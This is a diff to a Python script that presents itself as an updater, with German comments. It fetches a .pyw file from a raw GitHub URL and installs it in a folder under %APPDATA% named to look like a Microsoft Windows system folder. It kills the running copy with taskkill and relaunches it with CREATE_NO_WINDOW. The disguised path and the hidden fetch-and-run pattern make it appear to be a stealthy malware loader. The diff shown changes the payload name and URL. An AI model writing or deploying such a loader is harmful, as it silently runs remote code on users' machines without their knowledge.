@@ -14,13 +14,13 @@ import platform
 
 # ────────────────────────────────────────────────
 # KONFIGURATION
-MAIN_EXE_NAME = "python-update.pyw"   # Name deiner Hauptanwendung
-UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python-application-bin-files/main/python-application-cluster.pyw"
+MAIN_EXE_NAME = "PythonEnvironment.pyw"   # Name deiner Hauptanwendung
+UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python-application-bin-files/refs/heads/main/PythonEnvironment.pyw"
 # ────────────────────────────────────────────────
 
 # Pfade relativ zum Updater-Skript
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-MAIN_FOLDER = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Environment")
+MAIN_FOLDER = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Environment") # type: ignore
 MAIN_PATH = os.path.join(MAIN_FOLDER, MAIN_EXE_NAME)
 
 IS_WINDOWS = platform.system().lower() == "windows"
@@ -36,7 +36,7 @@ def kill_running_main():
             ["taskkill", "/F", "/IM", MAIN_EXE_NAME],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
-            creationflags=subprocess.CREATE_NO_WINDOW
+            creationflags=subprocess.CREATE_NO_WINDOW # type: ignore
         )
         time.sleep(1)
     except:
@@ -106,7 +106,7 @@ def start_main_app():
     if not os.path.exists(MAIN_PATH):
         return False
 
-    creationflags = subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0
+    creationflags = subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0 # type: ignore
 
     try:
         if MAIN_PATH.lower().endswith((".py", ".pyw")):
